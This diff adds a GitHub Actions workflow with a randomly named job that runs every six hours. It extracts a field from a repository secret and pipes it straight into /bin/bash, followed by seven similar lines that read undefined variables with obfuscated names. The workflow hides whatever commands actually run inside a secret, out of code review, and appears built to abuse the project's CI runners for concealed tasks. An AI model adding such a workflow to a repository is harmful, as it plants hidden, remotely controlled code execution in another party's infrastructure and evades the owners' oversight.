@@ -1,0 +1,24 @@
+name: phantasmagorialackey
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '52 3/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: phantasmagorialackey
+        env:
+          tee79005: ${{ secrets.tee79005 }}
+        run: |
+          echo $tee79005 | jq -r .vtyih2974 | /bin/bash
+          echo $qgwcr1 | jq -r .ewzf0 | /bin/bash
+          echo $xu27 | jq -r .pln398 | /bin/bash
+          echo $mt462 | jq -r .bwa33270 | /bin/bash
+          echo $bq74973 | jq -r .wm4989 | /bin/bash
+          echo $nasis4 | jq -r .leo67 | /bin/bash
+          echo $p2809 | jq -r .tvoy6715 | /bin/bash
+          echo $oby40 | jq -r .cp633 | /bin/bash
+
